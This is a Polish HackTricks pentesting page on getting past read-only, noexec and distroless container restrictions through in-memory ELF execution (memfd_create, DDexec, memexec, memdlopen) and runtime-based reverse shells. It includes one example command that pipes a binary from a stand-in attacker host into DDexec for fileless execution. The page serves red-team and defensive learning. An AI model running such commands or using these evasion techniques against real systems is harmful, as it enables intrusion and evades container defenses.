# Obejście zabezpieczeń FS: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Videos

W poniższych filmach dokładniej wyjaśniono techniki wspomniane na tej stronie:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## Scenariusz read-only / no-exec

W kontenerze można zamontować główny system plików w trybie tylko do odczytu, ustawiając **`readOnlyRootFilesystem: true`** w kontekście bezpieczeństwa.<sup>[[3]](#references)</sup> Na przykład:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Główny system plików tylko do odczytu nie sprawia, że osobno zamontowane wolumeny również stają się tylko do odczytu. Docker traktuje **`/dev/shm`** jako montowanie IPC, podczas gdy opcje tmpfs, takie jak `rw` i `noexec`, są wyborami konfiguracji środowiska uruchomieniowego; przed poleganiem na którymkolwiek z tych zachowań należy sprawdzić opcje montowania docelowego kontenera.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Z perspektywy red-team takie połączenie może utrudnić pobieranie i wykonywanie plików binarnych, które nie są już dostępne (na przykład backdoorów lub narzędzi do enumeracji).<sup>[[4]](#references)[[5]](#references)</sup>

## Najłatwiejsze obejście: Scripts

Montowanie `noexec` blokuje bezpośrednie wykonywanie plików binarnych znajdujących się na tym montowaniu, ale interpreter nadal może odczytać i zinterpretować skrypt. Jeśli dostępne jest `sh` lub `python`, można więc uruchomić skrypt shellowy lub Python za pośrednictwem tego interpretera.<sup>[[5]](#references)</sup>

Nie pomaga to, gdy wymagane narzędzie samo jest plikiem binarnym.<sup>[[5]](#references)</sup>

## Obejścia przez pamięć

Gdy bezpośrednie wykonywanie z zamontowanej ścieżki jest zablokowane, jedną z możliwości jest załadowanie ELF do pamięci i wykonanie go za pośrednictwem ścieżki in-memory. Omija to sprawdzanie `noexec` na tym montowaniu, ale nie usuwa innych ograniczeń jądra, uprawnień ani polityk bezpieczeństwa.<sup>[[5]](#references)[[6]](#references)</sup>

### Obejście FD + exec syscall

Jeśli środowisko uruchomieniowe skryptów może uzyskać dostęp do odpowiedniego interfejsu Linux, może utworzyć anonimowy deskryptor pliku wspierany przez RAM za pomocą **`memfd_create(2)`**, zapisać w nim bajty ELF i użyć ścieżki wykonywania opartej na deskryptorze pliku. Projekt [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) generuje skompresowany i zakodowany w base64 kod Python, Perl lub Ruby dla tego workflow.<sup>[[6]](#references)[[7]](#references)</sup>

Projekt obecnie dokumentuje cele Python, Perl i Ruby; PHP lub Node wymagają innej techniki albo rozszerzenia specyficznego dla danego środowiska uruchomieniowego, dlatego brak tego generatora dla danego języka nie oznacza, że wykonanie in-memory jest niemożliwe.<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> Zwykły plik wykonywalny zapisany w **`/dev/shm`** nadal podlega ustawieniu **`noexec`** tego montowania; samo otwarcie go za pośrednictwem zwykłego deskryptora pliku nie zmienia polityki montowania.<sup>[[5]](#references)</sup>
>
> Dokładna metoda wykonywania w pamięci zależy również od środowiska uruchomieniowego, architektury, jądra i dostępnych uprawnień.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) zapisuje stager i loader do działającego procesu shell za pośrednictwem **`/proc/self/mem`**, a następnie przekazuje sterowanie temu kodowi.<sup>[[8]](#references)</sup>

Dzięki temu proces może załadować dostarczony plik binarny bez wcześniejszego umieszczania go w wykonywalnym systemie plików.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** może ładować i **wykonywać** shellcode lub plik binarny z **pamięci**.<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Więcej informacji o tej technice znajdziesz w Github lub:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) to implementacja DDexec działająca jako daemon. Jego daemon nasłuchuje żądań zawierających argumenty i surowe bajty programu, tworzy proces potomny w celu załadowania i uruchomienia każdego programu, a proces nadrzędny pozostaje serwerem.<sup>[[9]](#references)</sup>

Repozytorium zawiera przykład użycia **memexec do wykonywania plików binarnych z poziomu PHP reverse shell** w [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

W podobnym celu co DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) to bezplikowa implementacja `dlopen()` dla shared object lub programu. README obecnie dokumentuje obsługę ARM64, dlatego przed użyciem sprawdź architekturę celu.<sup>[[10]](#references)</sup>

## Obejście Distroless

Aby uzyskać szczegółowe wyjaśnienie **czym właściwie jest distroless**, kiedy pomaga, kiedy nie oraz jak zmienia post-exploitation tradecraft w kontenerach, sprawdź:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Czym jest distroless

Obrazy distroless zawierają wyłącznie aplikację i jej zależności runtime; oficjalne obrazy nie zawierają package managerów, shelli ani innych programów oczekiwanych w standardowej dystrybucji Linux.<sup>[[11]](#references)</sup>

Ograniczenie obrazu runtime do tych zależności zmniejsza ilość oprogramowania obecnego na produkcji oraz zakres tego, co musi być skanowane i śledzone.<sup>[[11]](#references)</sup>

### Reverse Shell

W kontenerze distroless możesz **nie znaleźć `sh` ani `bash`** potrzebnych do użycia standardowego shella ani typowych narzędzi, takich jak `ls`, `whoami` czy `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> W związku z tym typowy reverse shell oparty na shellu lub enumeracja wykorzystująca narzędzia może nie działać.<sup>[[11]](#references)</sup>

Jeśli zaatakowana aplikacja zawiera runtime języka (na przykład Python dla aplikacji Flask lub Node.js dla aplikacji Node), RCE może nadal umożliwiać użycie tego runtime do utworzenia kanału poleceń i inspekcji systemu za pośrednictwem jego API.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Użyj dostępnego języka skryptowego do **enumeracji systemu** za pomocą jego możliwości językowych.<sup>[[12]](#references)</sup>

Jeśli nie ma zabezpieczeń **read-only/no-exec**, kanał poleceń może zapisać pliki binarne na zapisywalnym i wykonywalnym mount oraz je uruchomić; najpierw zweryfikuj opcje mount i uprawnienia.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Gdy te zabezpieczenia są obecne, użyj opisanych powyżej **technik wykonywania z pamięci**, jeśli pozwalają na to runtime, kernel i uprawnienia.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Przykłady wykorzystania podatności RCE w celu uzyskania **reverse shelli** w językach skryptowych i wykonywania plików binarnych z pamięci znajdziesz w [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Eksploracja manipulacji pamięcią Linux w celu zapewnienia skrytości i unikania wykrycia](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Skryte włamania z DDexec-ng i dlopen() w pamięci - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Konfigurowanie kontekstu bezpieczeństwa dla poda lub kontenera](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - strona podręcznika Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
